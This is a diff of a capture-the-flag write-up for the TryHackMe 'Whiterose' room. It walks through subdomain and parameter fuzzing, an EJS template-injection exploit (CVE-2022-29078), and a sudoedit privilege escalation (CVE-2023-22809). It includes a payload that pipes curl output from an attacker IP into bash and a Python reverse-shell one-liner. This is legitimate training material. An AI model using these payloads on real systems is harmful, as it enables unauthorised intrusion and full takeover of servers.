@@ -36,7 +36,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 There are two ports open.
 
-- **22** (`SSH`)  
+- **22** (`SSH`)
 - **80** (`HTTP`)
 
 ### Web 80
@@ -46,6 +46,7 @@ Visiting `http://10.10.116.77/` redirects us to `http://cyprusbank.thm/`, so let
 ```plaintext
 10.10.116.77 cyprusbank.thm
 ```
+
 {: file="/etc/hosts" }
 
 Afterward, visiting `http://cyprusbank.thm/` displays only a maintenance message.
@@ -62,6 +63,7 @@ $ ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/
 www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 110ms]
 admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 444ms]
 ```
+
 {: .wrap }
 
 We find two: `admin` and `www`. Let's add them to our hosts file:
@@ -69,6 +71,7 @@ We find two: `admin` and `www`. Let's add them to our hosts file:
 ```plaintext
 10.10.116.77 cyprusbank.thm www.cyprusbank.thm admin.cyprusbank.thm
 ```
+
 {: file="/etc/hosts" }
 
 Visiting `http://www.cyprusbank.thm/`, we find it appears identical to `http://cyprusbank.thm/`.
@@ -83,9 +86,9 @@ Visiting `http://admin.cyprusbank.thm/`, we are redirected to `http://admin.cypr
 
 ### Access as Gayle Bev
 
-The options in the top bar are inaccessible at this stage. However, the credentials `Olivia Cortez:olivi8` provided in the room allow us to log in.  
+The options in the top bar are inaccessible at this stage. However, the credentials `Olivia Cortez:olivi8` provided in the room allow us to log in.
 
-Upon successful login, we are presented with a page showing transactions and accounts, though we are unable to access customers' phone numbers.  
+Upon successful login, we are presented with a page showing transactions and accounts, though we are unable to access customers' phone numbers.
 
 ![Web 80 Admin Index Two](/images/tryhackme_whiterose/web_80_admin_index2.webp){: width="1200" height="600" }
 
@@ -129,7 +132,7 @@ When testing the form, we observed that it allows us to modify customer password
 
 ![Web 80 Admin Settings Three](/images/tryhackme_whiterose/web_80_admin_settings3.webp){: width="1200" height="600" }
 
-After testing the `name` and `password` parameters for vulnerabilities such as **SQL** or **SSTI**, we found no issues. Therefore, we decided to fuzz for additional parameters that the `/settings` endpoint might accept.  
+After testing the `name` and `password` parameters for vulnerabilities such as **SQL** or **SSTI**, we found no issues. Therefore, we decided to fuzz for additional parameters that the `/settings` endpoint might accept.
 
 Using **ffuf** for this task, we uncover a few interesting parameters:
 
@@ -143,9 +146,10 @@ message                 [Status: 200, Size: 2159, Words: 444, Lines: 61, Duratio
 client                  [Status: 500, Size: 1399, Words: 80, Lines: 11, Duration: 157ms]
 async                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 159ms]
 ```
+
 {: .wrap }
 
-While the `error` and `message` parameters merely cause the server to echo their values in the response, the `include`, `client`, and `async` parameters are more noteworthy.  
+While the `error` and `message` parameters merely cause the server to echo their values in the response, the `include`, `client`, and `async` parameters are more noteworthy.
 
 When both the `include` and `client` parameters are included, the server responds with a **500** error, displaying a message like this:
 
@@ -185,7 +189,7 @@ Upon testing this theory, we successfully leak the template, confirming our susp
 
 ![Web 80 Admin Settings Six](/images/tryhackme_whiterose/web_80_admin_settings6.webp){: width="1000" height="500" }
 
-As mentioned earlier, only a limited number of options are allowed to be passed with data. However, this is where the `CVE-2022-29078` vulnerability becomes relevant. By exploiting the `settings['view options']` parameter, we are able to pass any option without restriction.  
+As mentioned earlier, only a limited number of options are allowed to be passed with data. However, this is where the `CVE-2022-29078` vulnerability becomes relevant. By exploiting the `settings['view options']` parameter, we are able to pass any option without restriction.
 
 Certain options, like `outputFunctionName`, are utilized by **EJS** without any input sanitization to build the template body, allowing us to inject code.
 
@@ -196,6 +200,7 @@ By testing the **PoC** payload from the article, we confirm its effectiveness, a
 ```
 settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.11.72.22');s
 ```
+
 {: .wrap }
 
 ![Web 80 Admin Settings Seven](/images/tryhackme_whiterose/web_80_admin_settings7.webp){: width="1000" height="500" }
@@ -205,15 +210,17 @@ settings[view options][outputFunctionName]=x;process.mainModule.require('child_p
 10.10.116.77 - - [31/Oct/2024 05:03:44] "GET / HTTP/1.1" 200 -
 10.10.116.77 - - [31/Oct/2024 05:03:45] "GET / HTTP/1.1" 200 -
 ```
+
 At this point, we can use the vulnerability to obtain a shell. First, we set up our web server to serve a reverse shell payload. This allows us to execute the payload remotely and gain access to the system.
 
 ```console
 $ cat index.html
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.72.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'                                     
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.72.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
 $ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
+
 {: .wrap }
 
 Once the web server is serving the reverse shell payload, we can modify our injected payload to make the server download and execute the reverse shell. This step allows the server to initiate a connection back to our attacking machine, granting us access to the system.
@@ -221,6 +228,7 @@ Once the web server is serving the reverse shell payload, we can modify our inje
 ```console
 settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.11.72.22|bash');s
 ```
+
 {: .wrap }
 
 After sending our payload, the server becomes unresponsive, and we successfully receive a shell as the `web` user. This confirms that the reverse shell has been executed, giving us control over the server.
@@ -241,7 +249,7 @@ zsh: suspended  nc -lvnp 443
 $ stty raw -echo; fg
 [1]  + continued  nc -lvnp 443
 
-web@cyprusbank:~/app$ 
+web@cyprusbank:~/app$
 ```
 
 Once the shell is stabilized, we navigate to `/home/web/user.txt` and read the user flag, confirming our successful access to the system as the `web` user.
@@ -277,6 +285,7 @@ Sudoers file grammar version 48
 Sudoers I/O plugin version 1.9.12p1
 Sudoers audit plugin version 1.9.12p1
 ```
+
 While searching for vulnerabilities in `sudoedit` version `1.9.12p1`, we identify the `CVE-2023-22809` vulnerability. For more details, you can refer to [this security advisory from Synacktiv](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf).
 
 In essence, `sudoedit` allows users to specify their preferred editor using environment variables like `SUDO_EDITOR`, `VISUAL`, or `EDITOR`. These variables can include not only the editor itself but also additional arguments. When parsing them, `sudo` uses the `--` argument to separate the editor and its arguments from the file to be edited.
@@ -291,6 +300,7 @@ Here’s how we can exploit the vulnerability:
 web@cyprusbank:~/app$ export EDITOR="nano -- /etc/sudoers"
 web@cyprusbank:~/app$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
 ```
+
 As observed, we successfully opened the `/etc/sudoers` file using `nano`.
 
 ![Nano Sudoers File](/images/tryhackme_whiterose/nano_sudoers_file.webp){: width="1000" height="500" }
@@ -321,7 +331,5 @@ uid=0(root) gid=0(root) groups=0(root)
 root@cyprusbank:~# wc -c /root/root.txt
 21 /root/root.txt
 ```
+
 With the root flag in hand, we've successfully exploited the vulnerabilities and escalated our privileges, securing total control of the system. Another challenge completed, and another victory in the world of cybersecurity. On to the next!
-
-
-
